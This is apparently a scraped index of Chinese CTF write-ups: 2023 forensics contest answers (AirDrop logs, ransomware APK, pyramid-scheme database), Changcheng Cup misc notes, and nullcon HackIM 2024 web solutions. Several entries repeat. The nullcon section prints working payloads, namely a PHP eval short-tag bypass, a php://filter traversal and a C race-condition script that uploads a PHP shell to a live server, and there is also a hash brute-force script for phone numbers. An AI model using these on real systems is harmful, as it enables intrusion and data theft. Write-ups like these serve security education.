str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#7airdrop日志中可以分析出发送人appleid邮箱是什么标准格式12345qqcom"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#8airdrop日志中可以分析出发送的图片文件名是什么标准格式1txt"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#9airdrop日志中可以分析投送嫌疑人的手机号的sha256后五位是"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#10请结合工具分析日志找出airdrop投送方的手机号码答案格式18877776666"},{"categories":["Forensics","wp"],"content":"\r涉案个人PC镜像检验","date":"2024-05-06","objectID":"/2023fic/:2:0","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#涉案个人pc镜像检验"},{"categories":["Forensics","wp"],"content":"\r1.请计算计算机检材的原始磁盘的SHA256值(不区分大小写) FDD3ED3893E31D6E9A363A83969AA701D06E0E3E3628B7DC97A8A23C13FF027D ","date":"2024-05-06","objectID":"/2023fic/:2:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#1请计算计算机检材的原始磁盘的sha256值不区分大小写"},{"categories":["Forensics","wp"],"content":"\r2.检材2023FIC-PC.E01的计算机开机密码为 1qaz@WSX3edczhaohong ","date":"2024-05-06","objectID":"/2023fic/:2:2","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#image-20240409092949322httpsscofield-1313710994cosap-beijingmyqcloudcomimage-20240409092949322pngimageslim2检材2023fic-pce01的计算机开机密码为"},{"categories":["Forensics","wp"],"content":"\r3.请根据笔录交代，分析计算机检材，找出airdrop投递的图片内容中，违法网站的域名为？（答案格式：www.baidu.com) www.HLHL.com ","date":"2024-05-06","objectID":"/2023fic/:2:3","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#image-20240409092418542httpsscofield-1313710994cosap-beijingmyqcloudcomimage-20240409092418542pngimageslim3请根据笔录交代分析计算机检材找出airdrop投递的图片内容中违法网站的域名为答案格式wwwbaiducom"},{"categories":["Forensics","wp"],"content":"\r4.请计算嫌疑人计算机中名为“测试模拟器.ldbk”的文件的SHA256值仿真，导出，算SHA256 053950850ec6200c1a06a84b6374bd62242064780f7f680ca23932ee53dc0110 ","date":"2024-05-06","objectID":"/2023fic/:2:4","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#4请计算嫌疑人计算机中名为测试模拟器ldbk的文件的sha256值"},{"categories":["Forensics","wp"],"content":"\r5.“请根据笔录交代，分析计算机检材，钱包对应的密钥计算过程中，调用了以下哪种算法？（多选）A、AES B、DES C、BASE58 D、BASE64 E、HKDF” CE E:\\手机app测试\\server\\KeyPoolGenerator\\src\\main\\java\\org\\example ","date":"2024-05-06","objectID":"/2023fic/:2:5","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#5请根据笔录交代分析计算机检材钱包对应的密钥计算过程中调用了以下哪种算法多选"},{"categories":["Forensics","wp"],"content":"\r6.“请分析2023FIC-PC.E01检材，并回答，发现嫌疑人计算机中使用了哪种远程工具？（单选）A、ToDesk B、Xshell C、向日葵 D、网探 E、RayLink” C ","date":"2024-05-06","objectID":"/2023fic/:2:6","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#6请分析2023fic-pce01检材并回答发现嫌疑人计算机中使用了哪种远程工具单选"},{"categories":["Forensics","wp"],"content":"\r7.请综合分析检材,嫌疑人于2023年8月22日进行远程控制时，控制对端的公网IP为 116.192.174.254 ","date":"2024-05-06","objectID":"/2023fic/:2:7","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#7请综合分析检材嫌疑人于2023年8月22日进行远程控制时控制对端的公网ip为"},{"categories":["Forensics","wp"],"content":"\r8.请综合分析检材,嫌疑人于2023年8月22日进行远程控制时，控制对端的内网IP为 172.19.0.128 ","date":"2024-05-06","objectID":"/2023fic/:2:8","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#8请综合分析检材嫌疑人于2023年8月22日进行远程控制时控制对端的内网ip为"},{"categories":["Forensics","wp"],"content":"\r9.请综合分析检材,嫌疑人于2023年8月22日进行远程控制时，控制对端通过连接远程工具的中转服务器实现的P2P连接，该中转服务器的IP为 58.215.100.83 ","date":"2024-05-06","objectID":"/2023fic/:2:9","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#9请综合分析检材嫌疑人于2023年8月22日进行远程控制时控制对端通过连接远程工具的中转服务器实现的p2p连接该中转服务器的ip为"},{"categories":["Forensics","wp"],"content":"\r10.请综合分析检材,嫌疑人于2023年8月22日进行远程控制时，于什么时间释放远控行为？（答案各位为：23:59:59） 18:39:17 ","date":"2024-05-06","objectID":"/2023fic/:2:10","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#10请综合分析检材嫌疑人于2023年8月22日进行远程控制时于什么时间释放远控行为答案各位为235959"},{"categories":["Forensics","wp"],"content":"\r11.请计算APK勒索样本程序的SHA256值？(不区分大小写) 99c8af2df71e80a30f9fe33e73706fb11fde024517d228d606326bba14466988 导出来算sha256 12.APK程序在勒索的时候会向服务器申请钱包地址，请问申请后台IP地址为？ 13.APK从服务器端申请的包含钱包地址的配置文件的文件名为？ 14.APK程序在嫌疑人测试环境中，申请到的钱包地址为？ 15.嫌疑人模拟器中，有测试文件被加密，该文件被加密后文件名为？ 16.“APK程序勒索过程中，对于勒索文件使用的加密算法为？ A、AES B、DES C、BASE58 D、BASE64 E、HKDF” 17.请综合分析检材,嫌疑人模拟器环境中，申请的钱包地址对应的加密密钥为？ 18.嫌疑人模拟器中，有测试文件被加密，被加密文件的文件内容为？ 19.请综合分析检材,嫌疑人的密钥库文件的sha256值为？(不区分大小写) 20.如果嫌疑人使用的勒索钱包为74Vmx83bYvuhffEHnxVNnbbq9d1AAfJhXZ，那么该钱包对应的AES加密KEY为？ ","date":"2024-05-06","objectID":"/2023fic/:2:11","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#11请计算apk勒索样本程序的sha256值不区分大小写"},{"categories":["Forensics","wp"],"content":"\r涉案服务器镜像检验","date":"2024-05-06","objectID":"/2023fic/:3:0","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#涉案服务器镜像检验"},{"categories":["Forensics","wp"],"content":"\r1.请分析服务器中嫌疑人用于赚钱的sql程序，数据库中的用户记录总共有多少条？ 68307 ","date":"2024-05-06","objectID":"/2023fic/:3:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#1请分析服务器中嫌疑人用于赚钱的sql程序数据库中的用户记录总共有多少条"},{"categories":["Forensics","wp"],"content":"\r2.请分析服务器中嫌疑人用于赚钱的sql程序，用户最早的注册日期是什么？(标准格式：2020-01-01 12:00:00)A、2019-12-30 19:21:19 B、2019-12-30 19:22:19 C、2019-12-30 19:23:19 D、2019-12-30 19:24:19 E、2019-12-30 19:25:19\" B ","date":"2024-05-06","objectID":"/2023fic/:3:2","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#2请分析服务器中嫌疑人用于赚钱的sql程序用户最早的注册日期是什么标准格式2020-01-01-120000"},{"categories":["Forensics","wp"],"content":"\r3.请分析服务器中嫌疑人用于赚钱的sql程序，用户数据中的最深层级的用户名为？[组织架构中最大层数]（标准格式：中文名） 胡艳红 把离线数据库文件放到网钜里，导出excl表格，导出列name,username,pid(上级) 然后将该exel文件放到网钜里构建组织架构 pid设置为邀请人id 分析完后得到最深层级会员 ","date":"2024-05-06","objectID":"/2023fic/:3:3","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#3请分析服务器中嫌疑人用于赚钱的sql程序用户数据中的最深层级的用户名为组织架构中最大层数标准格式中文名"},{"categories":["Forensics","wp"],"content":"\r4.请分析服务器中嫌疑人用于赚钱的sql程序，直接奖励的总金额是多少？（标准格式：100.00） 1142590 ","date":"2024-05-06","objectID":"/2023fic/:3:4","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#4请分析服务器中嫌疑人用于赚钱的sql程序直接奖励的总金额是多少标准格式10000"},{"categories":["Forensics","wp"],"content":"\r5.请分析服务器中嫌疑人用于赚钱的sql程序，间接奖励的总金额是多少？（标准格式：100.00） 2293600 ","date":"2024-05-06","objectID":"/2023fic/:3:5","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#5请分析服务器中嫌疑人用于赚钱的sql程序间接奖励的总金额是多少标准格式10000"},{"categories":["Forensics","wp"],"content":"\r6.请分析服务器中嫌疑人用于赚钱的sql程序，贡献奖的总金额是多少？（标准格式：100.00） 2431042 ","date":"2024-05-06","objectID":"/2023fic/:3:6","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#6请分析服务器中嫌疑人用于赚钱的sql程序贡献奖的总金额是多少标准格式10000"},{"categories":["Forensics","wp"],"content":"\r7.请分析服务器中嫌疑人用于赚钱的sql程序，全球分红奖励的总金额是多少？（标准格式：100.00） 2036114.90 ","date":"2024-05-06","objectID":"/2023fic/:3:7","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#7请分析服务器中嫌疑人用于赚钱的sql程序全球分红奖励的总金额是多少标准格式10000"},{"categories":["Forensics","wp"],"content":"\r8.请分析服务器中嫌疑人用于赚钱的sql程序，个人投资的总金额是多少？（标准格式：100.00） 25043200 ","date":"2024-05-06","objectID":"/2023fic/:3:8","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#8请分析服务器中嫌疑人用于赚钱的sql程序个人投资的总金额是多少标准格式10000"},{"categories":["Forensics","wp"],"content":"\r9.请分析服务器中嫌疑人用于赚钱的sql程序，没有上线也没有下线的用户数量是多少？ 272 ","date":"2024-05-06","objectID":"/2023fic/:3:9","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#9请分析服务器中嫌疑人用于赚钱的sql程序没有上线也没有下线的用户数量是多少"},{"categories":["Forensics","wp"],"content":"\r10.请分析服务器中嫌疑人用于赚钱的sql程序，没有上线但有下线的用户数量有多少？ 8 ","date":"2024-05-06","objectID":"/2023fic/:3:10","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#10请分析服务器中嫌疑人用于赚钱的sql程序没有上线但有下线的用户数量有多少"},{"categories":["Forensics","wp"],"content":"\r11.请分析服务器中嫌疑人用于赚钱的exe程序，并计算其md5值？(不区分大小写) E8B1C00DCA13B5CA83BD7C5623A80F07 ","date":"2024-05-06","objectID":"/2023fic/:3:11","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#11请分析服务器中嫌疑人用于赚钱的exe程序并计算其md5值不区分大小写"},{"categories":["Forensics","wp"],"content":"\r12.请分析服务器中嫌疑人用于赚钱的exe程序，编译此程序的计算机用户名是什么？ MBRE ","date":"2024-05-06","objectID":"/2023fic/:3:12","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#12请分析服务器中嫌疑人用于赚钱的exe程序编译此程序的计算机用户名是什么"},{"categories":["Forensics","wp"],"content":"\r13.请分p析服务器中嫌疑人用于赚钱的exe程序，本程序一共创建了几个窗口？ 3 14.请分析服务器中嫌疑人用于赚钱的exe程序，窗口1中所显示的内容是什么？ ","date":"2024-05-06","objectID":"/2023fic/:3:13","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#13请分p析服务器中嫌疑人用于赚钱的exe程序本程序一共创建了几个窗口"},{"categories":["Forensics","wp"],"content":"\r15.请分析服务器中嫌疑人用于赚钱的exe程序，窗口1中所显示的内容使用了什么字体？ Microsoft YaHei Light 16.请分析服务器中嫌疑人用于赚钱的exe程序，窗口1中显示的字符串第一笔的长度为多少像素（答案格式只需填写数字) 17.请分析服务器中嫌疑人用于赚钱的exe程序，窗口2中解密字符串所使用的密钥为？ 18.“请分析服务器中嫌疑人用于赚钱的exe程序，窗口2中使用了解密算法为？ A. RC4 B.AES C.DES D.SHA256 E.ECC” ","date":"2024-05-06","objectID":"/2023fic/:3:14","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#15请分析服务器中嫌疑人用于赚钱的exe程序窗口1中所显示的内容使用了什么字体"},{"categories":["Forensics","wp"],"content":"\r19.请分析服务器中嫌疑人用于赚钱的exe程序，在俄罗斯方块游戏中，在键盘上依次按下哪些键可以进入窗口2？ SSADWWSWAADDSS ","date":"2024-05-06","objectID":"/2023fic/:3:15","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#19请分析服务器中嫌疑人用于赚钱的exe程序在俄罗斯方块游戏中在键盘上依次按下哪些键可以进入窗口2"},{"categories":["Forensics","wp"],"content":"\r20.请分析服务器中嫌疑人用于赚钱的exe程序，窗口2植入的广告中，赌博网站的域名为？ www.abcd.com ","date":"2024-05-06","objectID":"/2023fic/:3:16","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#20请分析服务器中嫌疑人用于赚钱的exe程序窗口2植入的广告中赌博网站的域名为"},{"categories":["wp"],"content":"第五场比赛 ","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:0:0","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#"},{"categories":["wp"],"content":"\rmisc","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:1:0","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#misc"},{"categories":["wp"],"content":"\r[clocked]\r发现压缩包损坏 用010Editor打开进行文件头修复 添加50 4B 03 04文件头 解压得到 发现是base64编码的图片，直接拖进赛博厨子 导出png图片，进行cloacked解密 得到输出文件，发现为zip压缩文件，解压得到flag ","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:1:1","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#clocked"},{"categories":["wp"],"content":"\r[ctfer]爆破加密的压缩包，得到密码123321 根据secret提示内容，进行wav提取 查找wav文件头57 41 56 45 随后进行stegpy解密stegpy out.wav -p ","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:1:2","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#ctfer"},{"categories":["wp"],"content":"\r[Pcap-keep_going]过滤器：http.response==200 得到RSA私钥和一张图片，其余流量全是加密过的，应该是TLS加密 将server.key导出，并添加到wireshark 随后追踪TLS流即可得到解密流量 在3132流得到哥斯拉流量的key 经过计算得解密key为45e329feb5d925be 拿来解密3149流中的请求体 导出流量中的图片 用steghide进行解密 └─$ steghide extract -sf keep_going.jpg -p 053700357621 ","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:1:3","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#pcap-keep_going"},{"categories":["wp"],"content":"\rwebweb是wanan打的 ","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:2:0","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#web"},{"categories":["wp"],"content":"\r[dabaojian]2019国赛华东北赛区线下赛几乎原题 2019国赛华东北赛区线下 · Ywc’s blog (yinwc.github.io) ","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:2:1","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#dabaojian"},{"categories":["wp"],"content":"\r[xff]\rSmarty模板注入 ","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:2:2","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#xff"},{"categories":["wp"],"content":"\r[api]\r","date":"2024-04-03","objectID":"/2024chang_cheng_cup/:2:3","series":null,"tags":["wp"],"title":"2024 第一届长城杯铁人三项初赛","uri":"/2024chang_cheng_cup/#api"},{"categories":["web","wp"],"content":"nullcon跟柏林工大联合搞的CTF比赛，web题目全部考察php nullcon HackIM 2024 is a web-based Jeopardy CTF. You do not need a dedicated server or a VPN environment in order to participate. The CTF starts at 09:30 UTC on March 14th and ends at 11:00 UTC on March 15th. ","date":"2024-04-01","objectID":"/2024nullcon_hackim_ctf_berlin/:0:0","series":null,"tags":["web","wp"],"title":"2024 nullcon_HackIM_CTF_Berlin","uri":"/2024nullcon_hackim_ctf_berlin/#"},{"categories":["web","wp"],"content":"\rweb","date":"2024-04-01","objectID":"/2024nullcon_hackim_ctf_berlin/:1:0","series":null,"tags":["web","wp"],"title":"2024 nullcon_HackIM_CTF_Berlin","uri":"/2024nullcon_hackim_ctf_berlin/#web"},{"categories":["web","wp"],"content":"\r[faleval] \u003c?php ini_set(\"error_reporting\", 0); ini_set(\"short_open_tag\", \"Off\"); if(isset($_GET['source'])) { highlight_file(__FILE__); } include \"flag.php\"; $input = $_GET['input']; if(preg_match('/[^\\x21-\\x7e]/', $input)) { die(\"Illegal characters detected!\"); } $filter = array(\"\u003c?php\", \"\u003c? \", \"?\u003e\", \"echo\", \"var_dump\", \"var_export\", \"print_r\", \"FLAG\"); $filter = array(\"\u003c?php\", \"\u003c? \", \"?\u003e\",\"*\", \"/\", \"var_dump\", \"var_export\", \"print_r\", \"FLAG\"); foreach($filter as \u0026$keyword) { if(str_contains($input, $keyword)) { die(\"PHP code detected!\\n\"); } } eval(\"?\u003e\" . $input); echo \"\\n\"; ?\u003e 过滤了php标签头\u003c?php，可以用短标签\u003c?= payload: ?source\u0026input=\u003c?=phpinfo(); ?source\u0026input=\u003c?=show_source('flag.php'); ","date":"2024-04-01","objectID":"/2024nullcon_hackim_ctf_berlin/:1:1","series":null,"tags":["web","wp"],"title":"2024 nullcon_HackIM_CTF_Berlin","uri":"/2024nullcon_hackim_ctf_berlin/#faleval"},{"categories":["web","wp"],"content":"\r[The Fast Falafel Shop]文件上传 根据题目描述，结合给的源码，可判断为条件竞争 刚开始没打通，我以为是本国网速延迟导致…..然鹅是能通的….. Minei3oat师傅写的c语言脚本 #include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003csys/socket.h\u003e #include \u003carpa/inet.h\u003e #include \u003cstring.h\u003e #include \u003cunistd.h\u003e const char POST[] = \"POST /contest.php HTTP/1.1\\r\\nHost: 52.59.124.14:5010\\r\\nContent-Type: multipart/form-data; boundary=---------------------------2293933683385722748470522066\\r\\nContent-Length: 413\\r\\n\\r\\n-----------------------------2293933683385722748470522066\\r\\nContent-Disposition: form-data; name=\\\"fileToUpload\\\"; filename=\\\"ctf0_shell.php\\\"\\r\\nContent-Type: application/x-php\\r\\n\\r\\n\u003c?php\\r\\necho file_get_contents('/var/www/html/flag.txt');\\r\\n?\u003e\\r\\n\\r\\n-----------------------------2293933683385722748470522066\\r\\nContent-Disposition: form-data; name=\\\"submit\\\"\\r\\n\\r\\nSubmit!\\r\\n-----------------------------2293933683385722748470522066--\\r\\n\\r\\n\"; const char GET[] = \"GET /uploads/ctf0_shell.php HTTP/1.1\\r\\nHost: 52.59.124.14:5010\\r\\n\\r\\n\"; int main() { // get sockets int post_socket = socket(AF_INET, SOCK_STREAM, 0); int get_socket = socket(AF_INET, SOCK_STREAM, 0); // connect them to the server struct sockaddr_in server; unsigned long addr; memset( \u0026server, 0, sizeof (server)); addr = inet_addr( \"52.59.124.14\" ); memcpy( (char *)\u0026server.sin_addr, \u0026addr, sizeof(addr)); server.sin_family = AF_INET; server.sin_port = htons(5010); connect(post_socket,(struct sockaddr*)\u0026server, sizeof(server)); connect(get_socket,(struct sockaddr*)\u0026server, sizeof(server)); // send requests send(post_socket, POST, sizeof(POST), 0); send(get_socket, GET, sizeof(GET), 0); // read answer char answer[1024]; memset( \u0026answer, 0, sizeof (answer)); read(post_socket, answer, 1024); puts(answer); memset( \u0026answer, 0, sizeof (answer)); read(get_socket, answer, 1024); puts(answer); // close connection close(get_socket); close(post_socket); } 程序在Linux环境汇总编译执行 ","date":"2024-04-01","objectID":"/2024nullcon_hackim_ctf_berlin/:1:2","series":null,"tags":["web","wp"],"title":"2024 nullcon_HackIM_CTF_Berlin","uri":"/2024nullcon_hackim_ctf_berlin/#the-fast-falafel-shop"},{"categories":["web","wp"],"content":"\r[bassy] \u003c?php ini_set(\"error_reporting\", 1); include \"flag.php\"; include \"./base85.class.php\"; // https://github.com/scottchiefbaker/php-base85 if(isset($_GET['source'])) { highlight_file(__FILE__); } if(isset($_GET['password'])) { $pw = base85::encode($_GET['password']); if($pw == base85::decode($ADMIN_PW)) { echo $FLAG; } } ?\u003e php弱比较 本题逻辑是，传入参数password的值经过base85编码后经过弱比较等同于$ADMIN_PWbase85解码后的值，根据题目描述，ADMIN_PW前几位是0P)s，解码后是0e1弱比较等同于0，经过测试，1+经过base85编码后是0e3弱比较等同于0 https://www.dcode.fr/ascii-85-encoding payload ?source\u0026password=1%2B 发包的时候需要对参数url编码 ","date":"2024-04-01","objectID":"/2024nullcon_hackim_ctf_berlin/:1:3","series":null,"tags":["web","wp"],"title":"2024 nullcon_HackIM_CTF_Berlin","uri":"/2024nullcon_hackim_ctf_berlin/#bassy"},{"categories":["web","wp"],"content":"\r[The Fast Falafel Shop 2]","date":"2024-04-01","objectID":"/2024nullcon_hackim_ctf_berlin/:1:4","series":null,"tags":["web","wp"],"title":"2024 nullcon_HackIM_CTF_Berlin","uri":"/2024nullcon_hackim_ctf_berlin/#the-fast-falafel-shop-2"},{"categories":["web","wp"],"content":"\r[Traversaller] \u003c?php ini_set(\"error_reporting\", 0); if(isset($_GET['source'])) { highlight_file(__FILE__); } include \"/var/www/html/flag.php\"; function sanitize_path($p) { return str_replace(array(\"\\0\",\"\\r\",\"\\n\",\"\\t\",\"\\x0B\",'..','./','.\\\\','//','\\\\\\\\',),'',trim($p, \"\\x00..\\x1F\")); } $path = $_GET['path']; if(isset($path) \u0026\u0026 str_contains($path, \"/var/www/html/static/\")) { die(file_get_contents(sanitize_path($path))); } ?\u003e 利用php为协议读取/var/www/html/flag.php，但要对题目对特殊的路径符号进行过滤的绕过 payload ?source\u0026path=php:/\\\\\\\\/filter/read=/var/www/html/static/convert.base64-encode/resource=/var/www/html/flag.php ","date":"2024-04-01","objectID":"/2024nullcon_hackim_ctf_berlin/:1:5","series":null,"tags":["web","wp"],"title":"2024 